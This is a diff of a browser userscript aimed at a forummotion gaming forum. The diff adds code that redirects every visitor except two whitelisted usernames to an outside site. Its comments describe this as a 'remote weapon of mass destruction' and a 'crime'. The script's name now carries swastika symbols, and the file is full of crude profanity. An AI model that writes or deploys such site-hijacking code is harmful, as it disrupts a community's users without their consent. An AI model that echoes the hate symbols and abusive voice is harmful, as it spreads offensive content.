@@ -1,5 +1,5 @@
 // ==UserScript==
-// @name SCREAM
+// @name 卐卐 SCREAM 卍卍
 // @description IT BEGINS
 // @namespace dicks@penis.fuck
 // @include http://aimgames.forummotion.com/*
@@ -8,9 +8,12 @@
 // @updateURL https://github.com/HulaSamsquanch/aimgames/raw/master/scream.user.js
 // @license MIT License (Expat); opensource.org/licenses/MIT
 // ==/UserScript==
-//allahu akbar
 
-function callback(response) {
+// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
+// ~~ BEGIN CODE FOR REMOTE WEAPON OF MASS DESTRUCTION ~~ //
+// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
+
+function callback(response) { ////// thanks kaff, you're now a partaker in this crime :^)
   document.body.appendChild(document.createElement('div')).innerHTML = "<div id='secret' style='display:none;'></div>";  
   var placeholder = document.createElement('div');  
   placeholder.innerHTML = response;
@@ -19,14 +22,20 @@ function callback(response) {
   }
   
   //var mymassivepenis = document.getElementById("emptyidcc").getElementsByTagName("tr")[6].getElementsByTagName("td")[1].innerHTML;  
-  if (document.getElementById("register")[0].value == "rafa1231518") {
-    console.log("holy fucking shit, it works")
-    //window.location.replace("http://google.com")
+  if (document.getElementById("register")[0].value != "rafa1231518" 
+  &&  document.getElementById("register")[0].value != "Kaffeinated") {
+    //console.log("holy fucking shit, it works")
+    window.location.replace("http://agor.io");
+  } else {
+    // may be incompatible in some browsers
+    //delete placeholder;
+    // more compatible but doesn't free from memory
+    placeholder = null;
   }
-  console.log(mymassivepenis);
+  //console.log(mymassivepenis);
 }
 
-function getPageContents(callback, url, params) {
+function getPageContents(callback, url, params) { ////// http://stackoverflow.com/a/28728475
   http = new XMLHttpRequest();
   if (params != null) {
     http.open('POST', url, true);
